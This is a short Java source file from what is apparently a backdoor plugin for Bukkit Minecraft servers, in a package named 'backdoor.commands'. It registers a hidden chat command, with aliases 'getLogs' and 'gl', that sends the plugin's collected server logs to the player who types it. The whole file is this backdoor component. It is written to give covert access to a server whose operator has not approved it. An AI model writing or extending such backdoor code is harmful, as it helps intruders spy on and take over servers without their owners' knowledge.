package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "get logs",
        usage = {"<prefix> <command>"},
        description = "Gives the logs to the player in chat",
        aliases = {"getLogs", "gl"})
public class GetLogsCommand extends Command {

    public GetLogsCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        event.getPlayer().sendMessage(Main.logger.getLogs());
    }
}
